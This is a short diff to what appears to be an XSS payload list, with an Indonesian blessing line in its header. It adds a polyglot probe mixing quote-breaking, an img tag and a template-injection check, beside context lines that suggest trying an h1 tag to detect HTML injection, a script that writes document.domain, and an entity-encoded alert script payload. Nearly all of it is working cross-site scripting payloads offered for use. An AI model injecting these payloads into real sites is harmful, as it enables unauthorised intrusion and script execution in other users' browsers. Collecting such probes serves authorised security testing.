@@ -9,6 +9,8 @@ SEMOGA BERKAH DAN MEMBAWA MANFAAT SELALU
 <h1>testing</h1> ----> try this html tag first (if platform vulnerable with html injection, it has possibility to XSS Vulnerbility)
 -----------------------------------------------------------------------
 
+'"`><img src=x>${{7*7}}
+
 <script>document.write(document.domain)</script>
 
 xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt
